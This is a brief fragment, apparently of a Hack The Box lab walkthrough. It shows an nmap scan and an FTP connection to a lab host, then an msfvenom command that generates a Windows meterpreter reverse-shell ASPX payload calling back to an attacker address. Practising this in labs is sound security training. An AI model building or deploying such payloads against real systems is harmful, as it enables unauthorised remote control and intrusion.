...
```shell-session
Luis Miguel Jaime Hernandez@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
...
```shell-session
Luis Miguel Jaime Hernandez@htb[/htb]$ ftp 10.10.10.5
...
```shell-session
Luis Miguel Jaime Hernandez@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
